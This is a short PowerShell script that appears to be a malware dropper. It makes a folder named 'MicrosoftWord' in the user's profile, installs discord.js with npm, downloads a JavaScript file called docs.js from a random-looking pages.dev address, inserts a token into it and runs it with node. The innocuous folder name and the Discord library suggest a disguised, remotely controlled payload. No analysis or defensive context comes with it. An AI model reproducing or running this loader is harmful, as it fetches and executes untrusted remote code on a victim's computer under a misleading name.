$folderPath = Join-Path -Path $env:USERPROFILE -ChildPath "MicrosoftWord"

if (-Not (Test-Path -Path $folderPath)) {
    New-Item -Path $folderPath -ItemType Directory
}

Set-Location -Path $folderPath

& "C:\Program Files\nodejs\npm.cmd" init -y

Start-Sleep -Seconds 5

& "C:\Program Files\nodejs\npm.cmd" install discord.js

Start-Sleep -Seconds 5

Invoke-WebRequest -Uri "https://ipspjyikta.pages.dev/files/docs.js" -OutFile "$folderPath\docs.js"

$token = "ok"

$content = Get-Content "$folderPath\docs.js" -Raw

$updatedContent = $content -replace "const TOKEN = 'token here';", "const TOKEN = '$token';"

Set-Content "$folderPath\docs.js" -Value $updatedContent

& "C:\Program Files\nodejs\node.exe" "$folderPath\docs.js"
